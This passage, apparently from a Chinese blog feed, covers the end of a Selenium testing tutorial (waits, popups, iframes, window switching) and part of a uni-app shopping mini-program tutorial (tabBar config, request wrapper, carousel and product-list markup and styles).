class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//显示等待</span><br><span class="line">WebDriverWait wait = new WebDriverWait(chromeDriver,5);</span><br><span class="line">WebElement element = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath(&quot;//a[text()=&#x27;_专业在线教育平台(ke.qq.com)&#x27;]&quot;)));</span><br></pre></td></tr></table></figure><h2 id="6-特殊元素定位"><a href="#6-特殊元素定位" class="headerlink" title="6.特殊元素定位"></a>6.特殊元素定位</h2><h3 id="6-1-alert弹窗"><a href="#6-1-alert弹窗" class="headerlink" title="6.1 alert弹窗"></a>6.1 alert弹窗</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//定位弹窗</span><br><span class="line">Alert alert =  chromeDriver.switchTo().alert();</span><br><span class="line">//对弹窗进行操作</span><br><span class="line">//同意操作</span><br><span class="line">alert.accept();</span><br><span class="line">//取消操作</span><br><span class="line">alert.dismiss();</span><br></pre></td></tr></table></figure><h3 id="6-2-confirm弹窗"><a href="#6-2-confirm弹窗" class="headerlink" title="6.2 confirm弹窗"></a>6.2 confirm弹窗</h3><p>confirm弹窗和alert一样，也是使用switchTo().alert()定位得到，然后使用accept和dismiss进行操作</p><p>我们还可以进行<code>alert.getText()</code>进行获取弹窗中的文本信息</p><h3 id="6-3-iframe定位"><a href="#6-3-iframe定位" class="headerlink" title="6.3 iframe定位"></a>6.3 iframe定位</h3><p>iframe是一种特殊的能够嵌套html文件的标签</p><p><code> &lt;iframe src=&quot;demo_iframe_sandbox.htm&quot;&gt;&lt;/iframe&gt;</code></p><p>我们在进入第一层html之后需要定位其他的html就需要进行如下操作</p><p><img src="https://img-blog.csdnimg.cn/d5ebfe5d8de14abe808e64f8b7246611.png" alt="iframe"></p><h3 id="6-4-窗口定位"><a href="#6-4-窗口定位" class="headerlink" title="6.4 窗口定位"></a>6.4 窗口定位</h3><p>窗口定位有两种方式，第一种是使用页面的名字进行定位，第二种是使用句柄进行定位，但是句柄定位就需要用到增强for循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//window定位</span><br><span class="line">chromeDriver.findElement(By.id(&quot;kw&quot;)).sendKeys(&quot;腾讯课堂&quot;);</span><br><span class="line">chromeDriver.findElement(By.id(&quot;su&quot;)).click();</span><br><span class="line">//第一个页面的handle</span><br><span class="line">String handle1 = chromeDriver.getWindowHandle();</span><br><span class="line">System.out.println(handle1);</span><br><span class="line">Thread.sleep(3000);</span><br><span class="line">chromeDriver.findElement(By.xpath(&quot;//span[@name=&#x27;label&#x27;]&quot;)).click();</span><br><span class="line">//第二个页面的handle</span><br><span class="line">Set&lt;String&gt; handle2 = chromeDriver.getWindowHandles();</span><br><span class="line">//切换窗口</span><br><span class="line">//根据name切换</span><br><span class="line">//chromeDriver.switchTo().window(&quot;腾讯课堂_百度搜索&quot;);</span><br><span class="line">//根据handle切换</span><br><span class="line">for(String handle : handle2) &#123;</span><br><span class="line">chromeDriver.switchTo().window(handle);</span><br><span class="line">if(chromeDriver.getTitle().equals(&quot;腾讯课堂_百度搜索&quot;)) &#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-5-select下拉框"><a href="#6-5-select下拉框" class="headerlink" title="6.5 select下拉框"></a>6.5 select下拉框</h3><p><img src="https://img-blog.csdnimg.cn/467a4377634245d099282b6e125d1247.png" alt="select下拉框"></p><h3 id="6-6-时间日期控件——js-脚本控制"><a href="#6-6-时间日期控件——js-脚本控制" class="headerlink" title="6.6 时间日期控件——js 脚本控制"></a>6.6 时间日期控件——js 脚本控制</h3><p>如果控件没有限制手动输入，我们可以使用sendKeys的方法进行输入</p><p>如果不能手动输入</p><p>我们还可以在java中执行js代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//利用js处理一部分元素</span><br><span class="line">JavascriptExecutor jsExecutor = (JavascriptExecutor) chromeDriver;</span><br><span class="line">jsExecutor.executeScript(&quot;document.getElementById(&#x27;train_date&#x27;).setArribute(&#x27;readOnly&#x27;,true)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-7-文件上传"><a href="#6-7-文件上传" class="headerlink" title="6.7 文件上传"></a>6.7 文件上传</h3><p><img src="https://img-blog.csdnimg.cn/39a4b1d8c6d146fcbedbb2fdd0956eef.png" alt="文件上传"></p>]]></content>
    
    
    
    <tags>
      
      <tag>测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uni-shop</title>
    <link href="/2022/10/12/uni-shop/"/>
    <url>/2022/10/12/uni-shop/</url>
    
    <content type="html"><![CDATA[<h1 id="uni-shop"><a href="#uni-shop" class="headerlink" title="uni-shop"></a>uni-shop</h1><p>一个小程序购物平台</p><h2 id="1-tabBar"><a href="#1-tabBar" class="headerlink" title="1.tabBar"></a>1.tabBar</h2><p>下方导航栏的样式如图：</p><p><img src="https://img-blog.csdnimg.cn/be0d831b1a3d4db6859d282f8c6b5739.png" alt="tabBar"></p><p>要设置tabBar的样式，需要在pages.json中使用”tabBar”属性书写</p><p>主要是list显示导航栏的列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&quot;tabBar&quot;: &#123;</span><br><span class="line">//选中文字颜色</span><br><span class="line">&quot;selectedColor&quot;: &quot;#b50e03&quot;,</span><br><span class="line">//未选中时文字的颜色</span><br><span class="line">&quot;color&quot;:&quot;#ccc&quot;,</span><br><span class="line">//导航栏配置信息</span><br><span class="line">&quot;list&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;text&quot;: &quot;首页&quot;,</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/index/index&quot;,</span><br><span class="line">//图标</span><br><span class="line">&quot;iconPath&quot;: &quot;./static/icon/home.png&quot;,</span><br><span class="line">//选中时候的图标</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;./static/icon/home-active.png&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;text&quot;: &quot;资讯&quot;,</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/news/news&quot;,</span><br><span class="line">&quot;iconPath&quot;: &quot;./static/icon/news.png&quot;,</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;./static/icon/news-active.png&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;text&quot;: &quot;购物车&quot;,</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/cart/cart&quot;,</span><br><span class="line">&quot;iconPath&quot;: &quot;./static/icon/cart.png&quot;,</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;./static/icon/cart-active.png&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;text&quot;: &quot;会员&quot;,</span><br><span class="line">&quot;pagePath&quot;: &quot;pages/member/member&quot;,</span><br><span class="line">&quot;iconPath&quot;: &quot;./static/icon/member.png&quot;,</span><br><span class="line">&quot;selectedIconPath&quot;: &quot;./static/icon/member-active.png&quot;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="2-首页"><a href="#2-首页" class="headerlink" title="2.首页"></a>2.首页</h2><p>对于node搭建的后台使用<code>node +文件名.js</code>的方式运行</p><p>首先要打开phpstudy提供一个本地服务器环境</p><p>如果phpstudy的数据库爆红，有可能是端口占用的情况，包括本机mysql正在运行在3306端口上</p><p>如果端口没有占用还是爆红，可能是没有打开mysql服务，在电脑的service中寻找mysql然后点击运行</p><h3 id="1-获取轮播图"><a href="#1-获取轮播图" class="headerlink" title="1.获取轮播图"></a>1.获取轮播图</h3><p>我使用node搭建的后台，然后发送请求获取数据</p><p>发送请求我们已经很熟悉了，使用uni.request</p><p>这里success中的this.swipers中的this指向需要依靠箭头函数实现，不然就要使用保存this的方法</p><p>uni.showToast是一个常用的提示框，类似于alert</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">getSwipers()&#123;</span><br><span class="line">uni.request(&#123;</span><br><span class="line">url: &quot;http://localhost:8082/api/getlunbo&quot;,</span><br><span class="line">//成功的回调</span><br><span class="line">success: res =&gt; &#123;</span><br><span class="line">if(res.data.status !== 0)&#123;</span><br><span class="line">//状态码错误 获取数据失败</span><br><span class="line">return uni.showToast(&#123;</span><br><span class="line">title: &quot;获取数据失败&quot;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;else&#123;</span><br><span class="line">this.swipers= res.data.message</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在OnLoad的钩子上调用这个函数就可以实现获取每次加载发送请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onLoad() &#123;</span><br><span class="line">this.getSwipers()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>但是我们现在要做的是对请求的封装</p><p>新建目录<code>util</code>，然后创建<code>api.js</code></p><p>里面实现对promise的封装：</p><p>这样所有的请求都可以使用myRequest封装好的promise，减少代码的重复度，解耦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//设置基础地址</span><br><span class="line">const BASE_URL = &quot;http://localhost:8082&quot;;</span><br><span class="line">//暴露封装好的myRequest</span><br><span class="line">export const myRequest = (options) =&gt;&#123;</span><br><span class="line">return new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">uni.request(&#123;</span><br><span class="line">url: BASE_URL+options.url,</span><br><span class="line">method: options.method || &quot;GET&quot;,</span><br><span class="line">data: options.data || &#123;&#125;,</span><br><span class="line">//成功的回调</span><br><span class="line">success: res =&gt; &#123;</span><br><span class="line">if(res.data.status !== 0)&#123;</span><br><span class="line">//状态码错误 获取数据失败</span><br><span class="line">return uni.showToast(&#123;</span><br><span class="line">title: &quot;获取数据失败&quot;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">resolve(res)</span><br><span class="line">&#125;,</span><br><span class="line">fail: err =&gt; &#123;</span><br><span class="line">uni.showToast(&#123;</span><br><span class="line">title: &quot;获取数据失败&quot;</span><br><span class="line">&#125;)</span><br><span class="line">//提示数据获取失败并调用reject</span><br><span class="line">reject(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把这个挂载到全局——<code>main.js</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//引入myRequest</span><br><span class="line">import &#123; myRequest &#125; from &quot;util/api.js&quot;</span><br><span class="line">//全局挂载到原型上</span><br><span class="line">Vue.prototype.$myreq = myRequest</span><br></pre></td></tr></table></figure><p>这样Vue的原型上就多了一个<code>$myreq</code></p><p>我们发送请求的时候直接调用这个函数然后传入options对象就可以了</p><p>因为获取的是一个promise对象，所以我们需要使用async包裹一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">async getSwipers()&#123;</span><br><span class="line">//封装好之后调用获取 res</span><br><span class="line">const res = await this.$myreq(&#123;</span><br><span class="line">url: &quot;/api/getlunbo&quot;,</span><br><span class="line">&#125;)</span><br><span class="line">this.swipers =  res.data.message</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-实现轮播图"><a href="#2-实现轮播图" class="headerlink" title="2.实现轮播图"></a>2.实现轮播图</h3><p>使用uni自带的swiper组件实现轮播</p><p>使用v-for进行循环生成item</p><p>然后动态绑定<code>img</code>属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 轮播图组件 --&gt;</span><br><span class="line">&lt;swiper indicator-dots circular&gt;</span><br><span class="line">&lt;!-- 每一个的轮播item --&gt;</span><br><span class="line">&lt;swiper-item v-for=&quot;item in swipers&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">&lt;!-- 轮播的内容 --&gt;</span><br><span class="line">&lt;image :src=&quot;item.img&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;/swiper-item&gt;</span><br><span class="line">&lt;/swiper&gt;</span><br></pre></td></tr></table></figure><h3 id="3-首页导航栏"><a href="#3-首页导航栏" class="headerlink" title="3.首页导航栏"></a>3.首页导航栏</h3><p>首先引入字体和图标以及相关样式，引用在app.vue中</p><p>这种字体图标的使用是在class中写 <code>iconfont +name</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;nav&quot;&gt;</span><br><span class="line">&lt;view class=&quot;nav_item&quot;&gt;</span><br><span class="line">&lt;view class=&quot;iconfont icon-ziyuan&quot;&gt;&lt;/view&gt;</span><br><span class="line">&lt;text&gt;超市&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;view class=&quot;nav_item&quot;&gt;</span><br><span class="line">&lt;view class=&quot;iconfont icon-guanyuwomen&quot;&gt;&lt;/view&gt;</span><br><span class="line">&lt;text&gt;联系我们&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;view class=&quot;nav_item&quot;&gt;</span><br><span class="line">&lt;view class=&quot;iconfont icon-tupian&quot;&gt;&lt;/view&gt;</span><br><span class="line">&lt;text&gt;社区图片&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;view class=&quot;nav_item&quot;&gt;</span><br><span class="line">&lt;view class=&quot;iconfont icon-shipin&quot;&gt;&lt;/view&gt;</span><br><span class="line">&lt;text&gt;学习视频&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>我们样式使用<code>flex</code>布局，弹性布局将盒子转换为弹性盒子</p><p><code>line-height</code>拉高我们的每一行高度，让字体图标下移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 导航栏</span><br><span class="line">.nav&#123;</span><br><span class="line">display: flex;</span><br><span class="line">.nav_item&#123;</span><br><span class="line">width: 25%;</span><br><span class="line">text-align: center;</span><br><span class="line">view&#123;</span><br><span class="line">width: 120rpx;</span><br><span class="line">height: 120rpx;</span><br><span class="line">border-radius: 60rpx;</span><br><span class="line">line-height: 120rpx;</span><br><span class="line">margin: 10rpx auto;</span><br><span class="line">background-color: #b50e03;</span><br><span class="line">color: #fff;</span><br><span class="line">font-size: 50rpx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text&#123;</span><br><span class="line">font-size: 30rpx;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-热门商品推荐"><a href="#4-热门商品推荐" class="headerlink" title="4.热门商品推荐"></a>4.热门商品推荐</h3><p>先写一个简单的title</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 热门商品 --&gt;</span><br><span class="line">&lt;view class=&quot;hot_goods&quot;&gt;</span><br><span class="line">&lt;view class=&quot;title&quot;&gt;热门商品&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>然后是相关样式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//热门商品</span><br><span class="line">.hot_goods&#123;</span><br><span class="line">background-color: #eee;</span><br><span class="line">.title&#123;</span><br><span class="line">height: 100rpx;</span><br><span class="line">line-height: 100rpx;</span><br><span class="line">background: #fff;</span><br><span class="line">text-align: center;</span><br><span class="line">color: $uni-color-shop;</span><br><span class="line">letter-spacing: 40rpx;</span><br><span class="line">margin: 10rpx 0rpx;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>#b50e03</code>这种红色用的很多，所以我们在uni.css文件中添加一项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* 行为相关颜色 */</span><br><span class="line">$uni-color-shop: #b50e03;</span><br></pre></td></tr></table></figure><p>然后我们设置color的时候就可以使用<code>$uni-color-shop</code>代替</p><p>接下来写一下热门商品列表的样式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;goodList&quot;&gt;</span><br><span class="line">&lt;view class=&quot;goodItem&quot;&gt;</span><br><span class="line">&lt;image src=&quot;&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;view class=&quot;price&quot;&gt;</span><br><span class="line">&lt;text&gt;￥123&lt;/text&gt;</span><br><span class="line">&lt;text&gt;￥234&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;view class=&quot;name&quot;&gt;</span><br><span class="line">swpu</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line"></span><br><span class="line">&lt;view class=&quot;goodItem&quot;&gt;</span><br><span class="line">&lt;image src=&quot;&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;view class=&quot;price&quot;&gt;</span><br><span class="line">&lt;text&gt;￥123&lt;/text&gt;</span><br><span class="line">&lt;text&gt;￥234&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;view class=&quot;name&quot;&gt;</span><br><span class="line">swpu</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>样式：其中有很多样式设置很巧妙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.goodList&#123;</span><br><span class="line">//开启flex</span><br><span class="line">display: flex;</span><br><span class="line">//换行</span><br><span class="line">flex-wrap: wrap;</span><br><span class="line">//贴边对齐</span><br><span class="line">justify-content: space-between;</span><br><span class="line">padding: 0 15rpx;</span><br><span class="line">.goodItem&#123;</span><br><span class="line">background: #fff;</span><br><span class="line">width: 355rpx;</span><br><span class="line">margin: 20rpx 0;</span><br><span class="line">padding: 15rpx;</span><br><span class="line">box-sizing: border-box;</span><br><span class="line">image&#123;</span><br><span class="line">width: 80%;</span><br><span class="line">height:300rpx;</span><br><span class="line">display: block;</span><br><span class="line">margin: 0 auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.price&#123;</span><br><span class="line">color: $uni-color-shop;</span><br><span class="line">font-size: 30rpx;</span><br><span class="line">text:nth-child(2)&#123;//单独设置第二个text样式</span><br><span class="line">color: #ccc;</span><br><span class="line">font-size: 28rpx;</span><br><span class="line">margin-left: 17rpx;</span><br><span class="line">text-decoration: line-through;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.name&#123;</span><br><span class="line">font-size: 28rpx;</span><br><span class="line">line-height: 50rpx;</span><br><span class="line">padding-top: 10rpx;</span><br><span class="line">padding-bottom: 15rpx;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-热门商品数据渲染"><a href="#5-热门商品数据渲染" class="headerlink" title="5.热门商品数据渲染"></a>5.热门商品数据渲染</h3><p>简单的发一个请求然后v-for遍历</p><p>data中写一个hotGoods数组准备存放我们的数据</p><p>然后发送请求接收数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 获取热门商品列表</span><br><span class="line">async getHotGoods()&#123;</span><br><span class="line">const res = await this.$myreq(&#123;</span><br><span class="line">url: &quot;/api/getgoods?pageindex=1&quot;,</span><br><span class="line">&#125;)</span><br><span class="line">this.hotGoods = res.data.message</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到数据然后遍历goodItem</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;goodItem&quot; v-for=&quot;item in hotGoods&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">&lt;image src=&quot;http://img13.360buyimg.com/n7/jfs/t1/131119/27/26844/20436/631938aaEcb21d77f/c6b07559e6a6db21.jpg&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;view class=&quot;price&quot;&gt;</span><br><span class="line">&lt;text&gt;￥&#123;&#123;item.sell_price&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;text&gt;￥&#123;&#123;item.market_price&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;view class=&quot;name&quot;&gt;</span><br><span class="line">&#123;&#123;item.title&#125;&#125;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><h3 id="6-热门数据组件化"><a href="#6-热门数据组件化" class="headerlink" title="6.热门数据组件化"></a>6.热门数据组件化</h3><p>新建一个components目录，下面加入goodList组件，将index中商品列表的部分移植过来</p><h3 id="7-实现导航栏跳转"><a href="#7-实现导航栏跳转" class="headerlink" title="7.实现导航栏跳转"></a>7.实现导航栏跳转</h3><p>对于导航栏，我们首先需要做一个更新，变成需要使用v-for循环得到</p><p>在data中建立一个navs数组存放数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">navs: [</span><br><span class="line">&#123;</span><br><span class="line">icon: &#x27;iconfont icon-ziyuan&#x27;,</span><br><span class="line">title: &#x27;超市&#x27;,</span><br><span class="line">url: &#x27;/pages/goods/goods&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">icon: &#x27;iconfont icon-guanyuwomen&#x27;,</span><br><span class="line">title: &#x27;联系我们&#x27;,</span><br><span class="line">url: &#x27;/pages/contact/contact&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">icon: &#x27;iconfont icon-tupian&#x27;,</span><br><span class="line">title: &#x27;社区图片&#x27;,</span><br><span class="line">url: &#x27;/pages/pics/pics&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">icon: &#x27;iconfont icon-shipin&#x27;,</span><br><span class="line">title: &#x27;学习视频&#x27;,</span><br><span class="line">url: &#x27;/pages/videos/videos&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>然后更改导航栏的结构，使用v-for得到数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;nav&quot;&gt;</span><br><span class="line">&lt;view class=&quot;nav_item&quot; v-for=&quot;(item,index) in navs&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">&lt;view :class=&quot;item.icon&quot;&gt;&lt;/view&gt;</span><br><span 